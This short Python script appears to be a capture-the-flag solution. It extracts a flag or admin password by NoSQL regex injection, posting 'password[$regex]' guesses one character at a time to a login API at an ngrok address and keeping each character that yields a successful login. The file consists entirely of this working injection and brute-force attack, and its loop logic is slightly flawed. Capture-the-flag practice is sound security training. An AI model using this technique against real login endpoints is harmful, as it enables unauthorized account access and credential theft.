import requests

flag = "CHTB{"

chars = '1234567890abcdefghijklmnopqrstuvwxyz{}-_'

url = "http://4341158638ef.ngrok.io/api/login"

for index in range(0,15):
	for char in chars: 
		req = flag + char + ".*"
		print(req)
		data = {"username": "admin", "password[$regex]": req} 
		response = requests.post(url, data)
		if (response.json()['logged'] == 1):
			flag += char
			continue


